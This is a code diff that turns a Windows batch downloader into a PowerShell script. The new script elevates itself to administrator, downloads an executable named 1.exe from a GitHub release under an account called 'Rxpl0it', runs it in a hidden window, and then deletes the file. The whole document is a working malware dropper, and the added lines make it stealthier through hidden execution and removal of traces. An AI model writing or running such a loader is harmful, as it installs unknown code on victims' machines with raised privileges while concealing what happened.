@@ -1,17 +1,20 @@
-@echo off
-set "URL=https://github.com/Rxpl0it/dwad/releases/download/wa/1.exe"
-set "TEMP_DIR=%TEMP%"
-set "EXE_NAME=1.exe"
+# Self-elevate the script if required
+if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+ if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
+  $CommandLine = "-File `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
+  Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
+  Exit
+ }
+}
 
-echo Downloading %EXE_NAME%...
-powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%TEMP_DIR%\%EXE_NAME%')"
+$url = "https://github.com/Rxpl0it/dwad/releases/download/wa/1.exe"
+$outpath = "$env:TEMP\1.exe"
 
-if exist "%TEMP_DIR%\%EXE_NAME%" (
-    echo Download complete. Executing %EXE_NAME%...
-    start "" "%TEMP_DIR%\%EXE_NAME%"
-) else (
-    echo Failed to download %EXE_NAME%.
-)
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $outpath
 
-echo Script execution complete.
-pause
+# Run the downloaded executable
+Start-Process -FilePath $outpath -WindowStyle Hidden
+
+# Clean up
+Remove-Item -Path $outpath -Force
